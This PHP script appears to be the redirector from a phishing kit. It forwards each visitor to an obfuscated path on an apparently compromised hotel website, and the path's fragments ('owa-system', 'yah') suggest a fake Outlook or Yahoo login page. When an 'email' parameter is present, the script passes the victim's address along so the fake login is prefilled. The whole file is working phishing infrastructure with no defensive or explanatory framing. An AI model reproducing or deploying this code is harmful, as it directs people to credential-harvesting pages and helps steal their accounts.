<?php
$external = 'https://hotelsamarsinghas.com/css/bak/psCsrfState3dc0981524-992a-6f1f-3957-9347owa-system0ce77a5e-contentMBI_SSLwre/yah/index.php';

if($_GET['email']){
$chief = $external."?email=$_GET[email]";

die(header("Location: $chief"));
}else{
die(header("Location: $external"));
}

?>